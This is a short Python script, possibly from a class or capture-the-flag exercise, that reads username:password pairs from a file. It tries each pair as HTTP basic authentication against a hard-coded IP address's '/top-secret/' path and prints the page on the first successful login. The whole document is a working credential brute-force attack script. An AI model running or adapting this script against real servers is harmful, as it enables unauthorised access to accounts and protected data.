import pwgen
import requests

login= pwgen.load_password_file("passwords.txt");

for item in login:
    colIndex = item.find(":");
    item1 = str(item[:colIndex]);
    item2 = str(item[colIndex+1:]);
    response = requests.get("http://104.236.109.232/top-secret/", auth=(item1, item2));
    if(response.status_code == 200):
        print(response.text);
        break;
